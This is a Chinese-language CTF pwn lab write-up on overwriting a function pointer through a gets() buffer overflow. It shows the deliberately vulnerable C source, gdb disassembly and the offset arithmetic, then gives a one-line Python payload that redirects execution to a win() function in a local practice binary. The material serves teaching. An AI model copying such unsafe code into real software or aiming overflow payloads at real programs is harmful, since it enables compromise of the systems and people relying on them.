## 先介绍工具吧！

使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。

本实验的程序和代码位于/home/test/4目录下，执行objdump -d pwn4可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作.

本文涉及相关实验：[《CTF
PWN练习之函数指针改写》](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014110409162800001&pk_campaign=freebuf-wemedia)（除了gdb之外，Linux还有许多工具可以帮助我们分析二进制文件。本实验将教会大家使用objdump来查找二进制程序中函数的地址信息，并通过修改函数指针变量的值为指定函数的地址来改写程序执行流程。）。

## 实验内容和步骤

大东:先来看题目描述 主机/home/test/4目录 下有一个pwn4程序，执行这个程序 可以 输入数据进行测试，当输入一定的数据量时 ，
可能什么都不会提示程序就结束运行了，也可能会提示这样的信息：

    
    
    calling function pointer, jumping to 0x41414141
    
    Segmentation fault

当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息：

    
    
    calling function pointer, jumping to 0x**XXXXXXXX**
    
    Congratulations, you pwned it.

请对pwn4程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入 数据，使之 输出成功的提示信息。

开始做题吧，先看源码，使用cd /home/test/4切换到程序所在目录，执行cat pwn4.c 即可看到源代码：

    
    
    #include <stdio.h>
    
    #include <string.h>
    
    
    
    
    typedef void (* func)();
    
    
    
    
    void win()// 输出 成功提示信息的函数
    
    {
    
    printf("Congratulations, you pwned it.\n");
    
    }
    
    
    
    
    int main(int argc, char** argv)
    
    {
    
    func fp;
    
    char buffer[64];
    
    
    
    
    fp = NULL;
    
    gets(buffer); // 可引发缓冲区溢出
    
    
    
    
    if (fp) // 判断函数指针变量fp是否不为NULL
    
    {
    
    printf("calling function pointer, jumping to 0x%08X\n", fp);
    
    fp(); // 调用 fp
    
    }
    
    return 0;
    
    }

程序定义了一个与buffer相邻的函数指针变量fp， 然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，fp
变量的值可以被改写，当fp 的值被改写为 win 函数的地址时，就可以输出成功提示的信息。

继续来看分析，执行gdb pwn4即可开始通过gdb对 pwn4进行调试，现在我们需要阅读main函数的汇编代码 ，在gdb中执行disas
main命令即可：

![](https://image.3001.net/images/20210319/1616134888_605442e8d82c92e93ca51.png!small)

大东:下面是对main函数中的汇编代码的解释：

> 0x08048428 <+0>: push %ebp
>
> 0x08048429 <+1>: mov %esp,%ebp
>
> 0x0804842b <+3>: and $0xfffffff0,%esp
>
> ; 在栈上开辟0x60字节的空间
>
> 0x0804842e <+6>: sub $0x60,%esp
>
> ; 初始化fp的值为NULL，其中fp位于[esp+0x5c]
>
> 0x08048431 <+9>: movl $0x0,0x5c(%esp)
>
> ; 执行gets(buffer)，其中buffer位于[esp+0x1c]
>
> 0x08048439 <+17>: lea 0x1c(%esp),%eax
>
> 0x0804843d <+21>: mov %eax,(%esp)
>
> 0x08048440 <+24>: call 0x8048320 < gets@plt>
>
> ; 判断fp是否为NULL
>
> 0x08048445 <+29>: cmpl $0x0,0x5c(%esp)
>
> 0x0804844a <+34>: je 0x8048467 < main+63>
>
> 0x0804844c <+36>: mov $0x8048554,%eax
>
> 0x08048451 <+41>: mov 0x5c(%esp),%edx
>
> 0x08048455 <+45>: mov %edx,0x4(%esp)
>
> 0x08048459 <+49>: mov %eax,(%esp)
>
> 0x0804845c <+52>: call 0x8048340 < printf@plt>
>
> ; 执行fp()
>
> 0x08048461 <+57>: mov 0x5c(%esp),%eax
>
> 0x08048465 <+61>: call *%eax
>
> 0x08048467 <+63>: mov $0x0,%eax
>
> 0x0804846c <+68>: leave
>
> 0x0804846d <+69>: ret

通过对上面的汇编代码进行分析， 我们知道buffer位于esp+0x1c处，而fp位于esp+0x5 c处，两个地址的距离为0x5 c - 0x1c =
0x40，即64，刚好为buffer数组的大小。 因此当输入数据的长度超过64字节 时，fp 变量
就可以被覆盖，但需要控制fp变量的值还需要小心的构造数据。我们只要合理控制 环境变量参数的第65~68字节的内容， 就可以成功发起溢出攻击了。

通过上面的步骤我们已经知道，只要合理控制输入 数据的第 65~68字节的内容，就可以成功发起 溢出攻击了
。现在的问题是找到函数win的地址信息，然后将fp的值改写为win函数的地址，这样就可以达到调用win函数的目的了。前面
提到过使用objdump可以查看函数的地址，现在在shell中执行objdump -d pwn4，然后在输出 信息中找到win函数的信息：

![](https://image.3001.net/images/20210319/1616134903_605442f78aa29f19a5656.png!small)

可以看到win函数的地址为0x08048414，因为机器采用小端格式，因此执行下面的语句就可以成功发起溢出攻击了：

    
    
    python -c "print 'A'*64+'\x14\x84\x04\x08'" | ./pwn4

攻击效果如下图所示：

![](https://image.3001.net/images/20210319/1616134928_6054431029333824c9594.png!small)

PWN类型的题目是CTF中的一个难点，要多下功夫。这次实验需要重点注意fp变量和汇编代码的分析。

